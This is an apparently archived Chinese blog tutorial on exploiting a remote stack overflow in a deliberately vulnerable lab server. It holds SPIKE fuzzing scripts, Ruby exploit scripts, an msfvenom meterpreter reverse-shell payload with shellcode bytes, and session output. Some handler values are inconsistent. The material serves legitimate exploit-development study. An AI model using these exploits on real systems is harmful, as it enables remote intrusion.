@@ -1,0 +1,981 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html class="theme-next gemini" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"hide","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"expandIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="缓冲区溢出攻击很容易被攻击者利用,因为C/C++语言并没有自动检测缓冲区溢出操作,同时程序编写人员在编写代码时也很难始终检查缓冲区是否可能溢出.利用溢出,攻击者可以将期望数据写入漏洞程序内存中的任意位置,甚至包括控制程序执行流的关键数据(比如函数调用后的返回地址),从而控制程序的执行过程并实施恶意行为.">
+<meta name="keywords" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows 远程栈溢出挖掘">
+<meta property="og:url" content="https://www.mkdirs.com/2019/04/20/渗透测试/Windows 远程栈溢出挖掘/index.html">
+<meta property="og:site_name" content="我的个人博客">
+<meta property="og:description" content="缓冲区溢出攻击很容易被攻击者利用,因为C/C++语言并没有自动检测缓冲区溢出操作,同时程序编写人员在编写代码时也很难始终检查缓冲区是否可能溢出.利用溢出,攻击者可以将期望数据写入漏洞程序内存中的任意位置,甚至包括控制程序执行流的关键数据(比如函数调用后的返回地址),从而控制程序的执行过程并实施恶意行为.">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://www.mkdirs.com/picture/20190420132307.jpg">
+<meta property="og:image" content="https://www.mkdirs.com/picture/20190420133036.jpg">
+<meta property="og:image" content="https://www.mkdirs.com/picture/20190420141415.jpg">
+<meta property="og:image" content="https://www.mkdirs.com/picture/20190420142300.jpg">
+<meta property="og:image" content="https://www.mkdirs.com/picture/20190420142517.jpg">
+<meta property="og:image" content="https://www.mkdirs.com/picture/20190420142944.jpg">
+<meta property="og:image" content="https://www.mkdirs.com/picture/20190420144416.jpg">
+<meta property="og:image" content="https://www.mkdirs.com/picture/20190420145419.jpg">
+<meta property="og:updated_time" content="2019-04-20T07:08:44.600Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Windows 远程栈溢出挖掘">
+<meta name="twitter:description" content="缓冲区溢出攻击很容易被攻击者利用,因为C/C++语言并没有自动检测缓冲区溢出操作,同时程序编写人员在编写代码时也很难始终检查缓冲区是否可能溢出.利用溢出,攻击者可以将期望数据写入漏洞程序内存中的任意位置,甚至包括控制程序执行流的关键数据(比如函数调用后的返回地址),从而控制程序的执行过程并实施恶意行为.">
+<meta name="twitter:image" content="https://www.mkdirs.com/picture/20190420132307.jpg">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="我的个人博客" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://www.mkdirs.com/2019/04/20/渗透测试/Windows 远程栈溢出挖掘/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Windows 远程栈溢出挖掘 | 我的个人博客</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">我的个人博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.mkdirs.com/2019/04/20/渗透测试/Windows 远程栈溢出挖掘/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="王瑞">
+      <meta itemprop="description" content="记录点滴技术成长之路">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我的个人博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Windows 远程栈溢出挖掘
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-04-20 11:22:50 / 修改时间：15:08:44" itemprop="dateCreated datePublished" datetime="2019-04-20T11:22:50+08:00">2019-04-20</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/渗透测试/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>缓冲区溢出攻击很容易被攻击者利用,因为C/C++语言并没有自动检测缓冲区溢出操作,同时程序编写人员在编写代码时也很难始终检查缓冲区是否可能溢出.利用溢出,攻击者可以将期望数据写入漏洞程序内存中的任意位置,甚至包括控制程序执行流的关键数据(比如函数调用后的返回地址),从而控制程序的执行过程并实施恶意行为.</p>
+<a id="more"></a>
+<p>该笔记用于帮助读者理解远程缓冲区溢出的挖掘,以及编写漏洞利用程序片段,下面在进行实验前,读者应该具备一定得汇编代码阅读能力,以及对基本渗透工具的使用,并且请确保准备好以下测试环境:</p>
+<blockquote>
+<p>被攻击主机: windows Server2008 (MyServer应用) 192.168.1.10<br>攻击主机: kali linux 192.168.1.2<br>x64dbg调试器: <a href="https://x64dbg.com/" target="_blank" rel="noopener">https://x64dbg.com/</a><br>ruby环境: <a href="http://www.ruby-lang.org" target="_blank" rel="noopener">http://www.ruby-lang.org</a><br>kali linux: <a href="https://www.kali.org/" target="_blank" rel="noopener">https://www.kali.org/</a><br>MyServer下载地址:<a href="https://files-cdn.cnblogs.com/files/LyShark/MyServer.zip" target="_blank" rel="noopener">https://files-cdn.cnblogs.com/files/LyShark/MyServer.zip</a></p>
+</blockquote>
+<p>缓冲区溢出的常用攻击方法是将恶意代码 shellcode 注入到程序中,并用其地址来覆盖程序本身函数调用的返回地址,使得返回时执行此恶意代码而不是原本应该执行的代码.也就是说,这种攻击在实施时通常首先要将恶意代码注入目标漏洞程序中,并能够得到远程系统的控制权.</p>
+<hr>
+<p>在这里作者<code>使用C语言</code>编写了一个带有漏洞的<code>Server服务程序</code>,并运行在<code>Windows Server2008</code>系统上,当你运行该服务程序后,该服务会<code>自动开启</code>本地的<code>9999 号端口</code>,你可以使用<code>NetCat,Telnet</code>进行<code>远程连接</code>,当你连接后服务器会<code>分配</code>一个随机的<code>Shell环境</code>,此时可以执行一些基本的测试命令.</p>
+<p><img src="/picture/20190420132307.jpg" alt="blockchain"></p>
+<p>下面我们将使用<code>NetCat工具</code>连接服务器,NC工具连接后,你可以执行一些测试函数,这些函数里面有一些带有漏洞,而一些则没有,这里你可以使用<code>help</code>来查询远程服务器所支持的命令,也可以使用<code>trun |</code>的方式调用命令,为了用户能够准确的将实验进行下去,我这里在每个函数后面备注了信息,其中标注有<code>yes</code>的函数是<code>存在漏洞</code>的,相反的则是<code>不存在</code>漏洞的函数.</p>
+<p><img src="/picture/20190420133036.jpg" alt="blockchain"><br><br></p>
+<h2 id="执行模糊测试"><a href="#执行模糊测试" class="headerlink" title="执行模糊测试"></a>执行模糊测试</h2><p><code>模糊测试(Fuzzing)</code>,是用于<code>漏洞挖掘</code>的探测工作,主要用于<code>发现</code>那些函数存在<code>漏洞</code>,通过向目标系统提供<code>非预期的输入</code>并监视异常结果来发现软件漏洞的方法,其原理主要是通过<code>输入</code>大量数据,发现程序中<code>存在的问题</code>.可以通过使程序某些内容溢出出现异常,或者输入的是程序规定的范围内的数据结果出现异常,从而找出程序的bug.</p>
+<p>尽管当今有许多模糊测试工具可以使用,但是在<code>Kali Linux</code>系统中默认集成了<code>SPIKE</code>,从技术上讲SPIKE实际上是一个<code>模糊器</code>创建工具包,它<code>提供了API</code>允许用户使用C语言基于网络的协议来创建自己的fuzzer,该工具可以通过<code>编写脚本</code>的方式进行测试任务,而无须自行编写上百行的测试代码.</p>
+<p><strong>创建测试脚本:</strong> 在测试之前,首先我们先来创建一个测试脚本,该脚本命名为<code>lyshark.spk</code>,脚本的内容如下.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># vim lyshark.spk</span></span><br><span class="line"></span><br><span class="line">s_readline();              <span class="comment"># 接收第一行的数据</span></span><br><span class="line">s_string(<span class="string">"stats |"</span>);       <span class="comment"># 向目标发送字串开头</span></span><br><span class="line">s_string_variable(<span class="string">"A"</span>);    <span class="comment"># 发送的主体字符串</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>测试STATS函数:</strong> 我们使用<code>generic_send_tcp</code>进行测试,测试服务器程序中<code>stats</code>函数是否存在漏洞,其命令如下:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># generic_send_tcp 192.168.1.10 9999 lyshark.spk 0 0</span></span><br><span class="line"></span><br><span class="line">Fuzzing Variable 0:1198</span><br><span class="line">line <span class="built_in">read</span>=</span><br><span class="line">Fuzzing Variable 0:1199</span><br><span class="line">line <span class="built_in">read</span>=</span><br><span class="line">Fuzzing Variable 0:1200</span><br><span class="line">line <span class="built_in">read</span>=</span><br><span class="line">Fuzzing Variable 0:1201</span><br><span class="line">line <span class="built_in">read</span>=</span><br><span class="line">Fuzzing Variable 0:1202</span><br><span class="line">line <span class="built_in">read</span>=</span><br><span class="line">Fuzzing Variable 0:1203</span><br><span class="line">^C</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>经过上面的测试后,发现服务器程序并没有崩溃,只是出现了一些错误日志,则说明<code>stats</code>函数不存在远程溢出漏洞,接着我们修改测试代码,并继续测试.</p>
+<p><strong>修改测试脚本:</strong> 我们接着打开<code>lyshark.spk</code>这个测试脚本,修改测试函数,这里改为<code>trun</code>即可.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># vim lyshark.spk</span></span><br><span class="line"></span><br><span class="line">s_readline();              <span class="comment"># 接收第一行的数据</span></span><br><span class="line">s_string(<span class="string">"trun |"</span>);        <span class="comment"># 向目标发送字串开头</span></span><br><span class="line">s_string_variable(<span class="string">"A"</span>);    <span class="comment"># 发送的主体字符串</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>测试TRUN函数:</strong> 我们使用<code>generic_send_tcp</code>进行测试,测试服务器程序中<code>trun</code>函数是否存在漏洞,其命令如下:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># generic_send_tcp 192.168.1.10 9999 lyshark.spk 0 0</span></span><br><span class="line"></span><br><span class="line">Fuzzing Variable 0:1198</span><br><span class="line">line <span class="built_in">read</span>=</span><br><span class="line">Fuzzing Variable 0:1199</span><br><span class="line">line <span class="built_in">read</span>=</span><br><span class="line">Fuzzing Variable 0:1200</span><br><span class="line">line <span class="built_in">read</span>=</span><br><span class="line">Fuzzing Variable 0:1201</span><br><span class="line">line <span class="built_in">read</span>=</span><br><span class="line">Fuzzing Variable 0:1202</span><br><span class="line">line <span class="built_in">read</span>=</span><br><span class="line">Fuzzing Variable error</span><br><span class="line">^C</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>经过上面的模糊测试,你会发现<code>服务器端崩溃了</code>,我们的服务器在应对<code>二进制字符串</code>时表现异常,其实这就是一个典型的<code>远程缓冲区溢出</code>漏洞,之所以会崩溃的原因是因为缓冲区没有进行合理的<code>边界检测</code>,从而超出了缓冲区的容量,恶意的字符串<code>覆盖了EIP</code>指针,导致服务器不知道下一跳去哪里取指令,从而崩溃了.<br><br></p>
+<h2 id="控制EIP指针"><a href="#控制EIP指针" class="headerlink" title="控制EIP指针"></a>控制EIP指针</h2><p>在上面的模糊测试环节,我们已经清楚的知道路目标服务器的,<code>trun函数</code>存在远程缓冲区<code>溢出漏洞</code>,<code>接下来</code>我们就来测试一下<code>目标缓冲区的大小</code>,这也是<code>控制EIP</code>指针的前提条件,现在我们需要具体的知道使用多少个字节才能够<code>不多不少</code>的覆盖掉程序中EIP寄存器,首先先来创建一个Ruby脚本,来完成远程对缓冲区的填充,这里Ruby的代码如下.<br><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">root@kali<span class="symbol">:~</span><span class="comment"># vim lyshark.rb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span></span><br><span class="line">host = <span class="string">'192.168.1.10'</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">sock = TCPSocket.open(host, port)</span><br><span class="line"></span><br><span class="line">command = <span class="string">"trun |"</span>              <span class="comment"># 指定要测试的函数</span></span><br><span class="line">header = <span class="string">"/.:/"</span>                 <span class="comment"># 数据包发送固定写法</span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">2000</span>                <span class="comment"># 生成2000个A(猜测)</span></span><br><span class="line">eip = <span class="string">"BBBB"</span>                    <span class="comment"># 暂且填充为BBBB</span></span><br><span class="line">nops = <span class="string">"\x90"</span> * <span class="number">20</span>              <span class="comment"># 填充20个nop指令</span></span><br><span class="line"></span><br><span class="line">sock.gets()                              <span class="comment"># 获取服务端返回的字符串</span></span><br><span class="line">sock.puts( command+header+buf+eip+nops ) <span class="comment"># 开始发送2000个A</span></span><br><span class="line">sock.close</span><br><span class="line"></span><br><span class="line">root@kali<span class="symbol">:~</span><span class="comment"># ruby lyshark.rb</span></span><br></pre></td></tr></table></figure></p>
+<p>上面的代码主要作用是,生成<code>2000个A</code>,在Kali上运行代码后,发现服务器崩溃了,崩溃事件中还提供了具体的EIP地址,这说明脚本正常工作了.</p>
+<p><img src="/picture/20190420141415.jpg" alt="blockchain"></p>
+<p>接下来我们在服务器上,使用<code>x64dbg调试器</code>附加到<code>MyServer.exe</code>这个服务程序的进程上,并在调试器附加的基础上,再次执行<code>lyshark.rb</code>这个脚本.</p>
+<p><img src="/picture/20190420142300.jpg" alt="blockchain"></p>
+<p>当脚本运行后,不出所料<code>程序再次崩溃</code>,这里我们主要关心崩溃后的堆栈情况,下图可发现EIP指针为<code>90904242</code>,也就是说当前EIP一半在nop雪橇上另一半在AA上,由此我们可以猜测此时我们填充少了.</p>
+<p><img src="/picture/20190420142517.jpg" alt="blockchain"></p>
+<p>通过上面的EIP覆盖情况,发现填充物少填充了2个字符,接着我们<code>修改攻击脚本</code>,将填充物改大一些,这次我们改成<code>2002</code>,也就是说向远程堆栈内填充<code>2002个A</code>,重新运行服务器上的服务,并<code>再次运行</code>攻击脚本.<br><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span></span><br><span class="line">host = <span class="string">'192.168.1.10'</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">sock = TCPSocket.open(host, port)</span><br><span class="line"></span><br><span class="line">command = <span class="string">"trun |"</span>              <span class="comment"># 指定要测试的函数</span></span><br><span class="line">header = <span class="string">"/.:/"</span>                 <span class="comment"># 数据包发送固定写法</span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">2002</span>                <span class="comment"># 生成2002个A</span></span><br><span class="line">eip = <span class="string">"BBBB"</span>                    <span class="comment"># 方便区分</span></span><br><span class="line">nops = <span class="string">"\x90"</span> * <span class="number">50</span></span><br><span class="line"></span><br><span class="line">sock.gets()</span><br><span class="line">sock.puts( command+header+buf+eip+nops ) <span class="comment"># 发送2002个A</span></span><br><span class="line">sock.close</span><br><span class="line"></span><br><span class="line">root@kali<span class="symbol">:~</span><span class="comment"># ruby lyshark.rb</span></span><br></pre></td></tr></table></figure></p>
+<p>当攻击脚本运行后,我们查看一下EIP指针的位置,你会发现此时的EIP地址已经指向了<code>42424242</code>,也就是我们脚本中填充的<code>eip = &quot;BBBB&quot;</code>,由此可得出填充物的大小刚好为<code>2002</code>个A,在下图的堆栈区域中,也可以清晰地看到我们填充的<code>AAAA</code>与<code>nop雪橇</code>的分界线.</p>
+<p><img src="/picture/20190420142944.jpg" alt="blockchain"></p>
+<h2 id="构建漏洞攻击"><a href="#构建漏洞攻击" class="headerlink" title="构建漏洞攻击"></a>构建漏洞攻击</h2><p>在上面的环节中我们已经<code>确定了</code>填充物的<code>大小</code>,但细心的你会发现程序每次运行其<code>栈地址</code>都是<code>随机变化</code>的,在Windows<code>漏洞利用</code>过程中,由于<code>动态链接库</code>的装入和卸载等原因,Windows进程的函数栈帧可能<code>产生移位</code>,即<code>ShellCode</code>在内存中的地址是<code>动态变化</code>的,因此需要<code>Exploit(漏洞利用代码)</code>在运行时动态定位栈中的<code>ShellCode</code>地址.</p>
+<p>我们第一步就是寻找一个跳板,能够动态的定位栈地址的位置,在这里我们使用<code>jmp esp</code>作为跳板指针,其<code>基本思路</code>就是,使用内存中任意一个<code>jmp esp</code>的地址<code>覆盖返回</code>地址,函数返回后被<code>重定向</code>去执行内存中<code>jmp esp</code>指令,而<code>esp寄存器</code>的地址正好是我们布置好的<code>nop雪橇</code>的位置,此时<code>EIP指针</code>就会<code>顺着nop雪橇</code>滑向我们构建好的恶意代码,从而触发我们预先布置好的ShellCode代码.</p>
+<p><strong>选择模块:</strong> 首先通过<code>x64dbg调试器</code>附加服务程序,然后选择符号菜单,这里我找到了<code>kernelbase.dll</code>这个外部模块,模块的选择是随机的,只要模块内部存在<code>jmp esp</code>指令就可以利用.</p>
+<p><img src="/picture/20190420144416.jpg" alt="blockchain"></p>
+<p><strong>搜索跳板:</strong> 接着搜索该模块中的<code>jmp esp</code>指令,因为这个指令地址是固定的,我们就将<code>EIP指针</code>跳转到这里,又因esp寄存器存储着当前的栈地址,所以刚好跳转到我们布置好的nop雪橇的位置上.</p>
+<p><img src="/picture/20190420145419.jpg" alt="blockchain"></p>
+<p>在<code>x64dbg调试器</code>的反汇编界面中,按下<code>ctrl + f</code> 搜索,并记录下这个搜寻到的地址<code>0x77433f73</code>,其实这里随便一个只要是<code>jmp esp 指令</code>的都可以,我们将其作为EIP的跳转地址.<br><br></p>
+<h2 id="生成利用代码"><a href="#生成利用代码" class="headerlink" title="生成利用代码"></a>生成利用代码</h2><p>当然可以从零开始构建漏洞攻击所使用的ShellCode但这需要你具备汇编的编程能力,不过庆幸的是Metaspoloit在这方面可以为我们做很多,我们可以通过MSF提供的<code>msfvenom命令</code>快速的生成一个有效载荷.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfvenom -a x86 --platform Windows \</span></span><br><span class="line">&gt;                              -p windows/meterpreter/reverse_tcp \</span><br><span class="line">&gt;                              -b <span class="string">'\x00\x0b'</span> LHOST=192.168.1.2 LPORT=9999 -f ruby</span><br><span class="line"></span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Payload size: 368 bytes</span><br><span class="line">Final size of ruby file: 1612 bytes</span><br><span class="line">buf =</span><br><span class="line"><span class="string">"\xba\x94\x23\x08\x8e\xdb\xd1\xd9\x74\x24\xf4\x5e\x33\xc9"</span> +</span><br><span class="line"><span class="string">"\xb1\x56\x31\x56\x13\x03\x56\x13\x83\xee\x68\xc1\xfd\x72"</span> +</span><br><span class="line"><span class="string">"\x78\x84\xfe\x8a\x78\xe9\x77\x6f\x49\x29\xe3\xfb\xf9\x99"</span> +</span><br></pre></td></tr></table></figure>
+<p>最后在msf控制主机,启动一个侦听器,等待运行脚本.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt;</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.10</span><br><span class="line">lhost =&gt; 192.168.1.10</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 9999</span><br><span class="line">lport =&gt; 8888</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.10:9999</span><br></pre></td></tr></table></figure></p>
+<p>经过上面的步骤我们已经构建出了漏洞利用代码,此时我们运行代码.<br><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span></span><br><span class="line">host = <span class="string">'192.168.1.10'</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">sock = TCPSocket.open(host, port)</span><br><span class="line"></span><br><span class="line">command = <span class="string">"trun |"</span>       <span class="comment">#数据包包头写法</span></span><br><span class="line">header = <span class="string">"/.:/"</span>          <span class="comment">#数据包发送固定写法</span></span><br><span class="line"></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">2002</span>         <span class="comment">#2002个字节刚好填充满</span></span><br><span class="line">eip = <span class="string">"\x73\x3f\x43\x77"</span> <span class="comment">#EIP=77433F73  将该地址反写</span></span><br><span class="line">nops = <span class="string">"\x90"</span> * <span class="number">20</span>       <span class="comment">#此处是nop雪橇填充的20个字节</span></span><br><span class="line"></span><br><span class="line">shellcode =</span><br><span class="line"><span class="string">"\xd9\xf7\xd9\x74\x24\xf4\x5a\xbb\xc8\xbb\x47\x96\x29\xc9"</span> +</span><br><span class="line"><span class="string">"\xb1\x56\x31\x5a\x18\x83\xc2\x04\x03\x5a\xdc\x59\xb2\x6a"</span> +</span><br><span class="line"><span class="string">"\x34\x1f\x3d\x93\xc4\x40\xb7\x76\xf5\x40\xa3\xf3\xa5\x70"</span> +</span><br><span class="line"><span class="string">"\xa7\x56\x49\xfa\xe5\x42\xda\x8e\x21\x64\x6b\x24\x14\x4b"</span> +</span><br><span class="line"><span class="string">"\x6c\x15\x64\xca\xee\x64\xb9\x2c\xcf\xa6\xcc\x2d\x08\xda"</span> +</span><br><span class="line"><span class="string">"\x3d\x7f\xc1\x90\x90\x90\x66\xec\x28\x1a\x34\xe0\x28\xff"</span> +</span><br><span class="line"><span class="string">"\x8c\x03\x18\xae\x87\x5d\xba\x50\x44\xd6\xf3\x4a\x89\xd3"</span> +</span><br><span class="line"><span class="string">"\x4a\xe0\x79\xaf\x4c\x20\xb0\x50\xe2\x0d\x7d\xa3\xfa\x4a"</span> +</span><br><span class="line"><span class="string">"\xb9\x5c\x89\xa2\xba\xe1\x8a\x70\xc1\x3d\x1e\x63\x61\xb5"</span> +</span><br><span class="line"><span class="string">"\xb8\x4f\x90\x1a\x5e\x1b\x9e\xd7\x14\x43\x82\xe6\xf9\xff"</span> +</span><br><span class="line"><span class="string">"\xbe\x63\xfc\x2f\x37\x37\xdb\xeb\x1c\xe3\x42\xad\xf8\x42"</span> +</span><br><span class="line"><span class="string">"\x7a\xad\xa3\x3b\xde\xa5\x49\x2f\x53\xe4\x05\x9c\x5e\x17"</span> +</span><br><span class="line"><span class="string">"\x71\xe3\xf6\xf7"</span></span><br><span class="line"></span><br><span class="line">sock.gets()</span><br><span class="line">sock.puts( command+header+buf+eip+nops+shellcode )</span><br><span class="line">sock.close</span><br></pre></td></tr></table></figure></p>
+<p>查看攻击主机,即可看到一个反向连接shell,此时我们可以远程执行任意命令.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.10:9999</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.10</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.10:9999 -&gt; 192.168.1.2:9900) at 2019-03-27 02:11:56 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : web-server</span><br><span class="line">OS              : Windows Server2008.</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure></p>
+<p>教程到这里就结束了,这里只是一个挖掘漏洞的小例子,根据这个例子读者就可以了解漏洞挖掘的具体流程,其实大多数漏洞挖掘无外乎这些步骤,只是在一些方面会有一些差异而已,但大同小异.</p>
+
+      
+    </div>
+
+    
+
+<!--增加的底部版权代码-->
+<div>
+      
+        
+<div class="my_post_copyright">
+  <p><span>本文标题:</span><a href="/2019/04/20/渗透测试/Windows 远程栈溢出挖掘/">Windows 远程栈溢出挖掘</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 王瑞 的个人博客">王瑞</a></p>
+  <p><span>发布时间:</span>2019年04月20日 - 11:04</p>
+  <p><span>最后更新:</span>2019年04月20日 - 15:04</p>
+  <p><span>原始链接:</span><a href="/2019/04/20/渗透测试/Windows 远程栈溢出挖掘/" title="Windows 远程栈溢出挖掘">https://www.mkdirs.com/2019/04/20/渗透测试/Windows 远程栈溢出挖掘/</a>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者</p>
+</div>
+
+      
+</div>
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"> <i class="fa fa-tag"></i> 渗透测试</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
